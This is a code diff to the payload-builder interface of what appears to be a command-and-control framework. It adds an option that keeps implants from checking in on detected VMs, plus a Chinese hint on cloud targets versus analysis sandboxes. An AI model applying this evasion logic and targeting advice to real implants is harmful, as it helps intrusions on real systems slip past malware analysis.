@@ -260,7 +260,8 @@ function GenerateUI(listeners_type)
     }
 
     let hline2 = form.create_hline()
-    let checkOpsec = form.create_check("OPSEC Checks (anti-debug, VM detection, string obfuscation)");
+    let checkOpsec = form.create_check("OPSEC Checks (anti-debug, VM detection, string obfuscation)")
+    let checkOpsecVmExit = form.create_check("VM detection blocks check-in (cloud KVM/QEMU hosts WILL be blocked)");
 
     let layout = form.create_gridlayout();
     layout.addWidget(labelArch, 0, 0, 1, 1);
@@ -275,6 +276,7 @@ function GenerateUI(listeners_type)
     layout.addWidget(spinReconnCount, 4, 1, 1, 1);
     layout.addWidget(hline2, 5, 0, 1, 2);
     layout.addWidget(checkOpsec, 6, 0, 1, 2);
+    layout.addWidget(checkOpsecVmExit, 7, 0, 1, 2);
 
     let container = form.create_container()
     container.put("arch", comboArch)
@@ -282,6 +284,7 @@ function GenerateUI(listeners_type)
     container.put("reconn_timeout", textReconnTimeout)
     container.put("reconn_count", spinReconnCount)
     container.put("opsec_enabled", checkOpsec)
+    container.put("opsec_vm_exit", checkOpsecVmExit)
 
     let panel = form.create_panel()
     panel.setLayout(layout)
@@ -289,7 +292,7 @@ function GenerateUI(listeners_type)
     return {
         ui_panel: panel,
         ui_container: container,
-        ui_height: 400,
+        ui_height: 430,
         ui_width: 550
     }
 }
@@ -333,6 +336,9 @@ function BuildSchema(listener_type)
               group: "重连与 OPSEC", hint: "0 = 无限重连" },
             { key: "opsec_enabled", label: "OPSEC 检测（反调试 / VM 检测 / 字符串混淆）", type: "bool",
               group: "重连与 OPSEC" },
+            { key: "opsec_vm_exit", label: "VM 检测命中即不上线", type: "bool",
+              group: "重连与 OPSEC",
+              hint: "默认关：云主机（KVM/QEMU ECS）与分析沙箱不可区分，默认拦截会误杀全部云目标。只打物理机的行动才勾选" },
             { key: "stager_ts_host", label: "Teamserver 地址", type: "text",
               group: "Stager 下载端点", group_open: true, show_if: { format_in: F_STAGER },
               hint: "内层载荷挂在 teamserver 自己的 /api/s/<token> 上，不是监听器端口；控制台默认填当前页面的地址" },
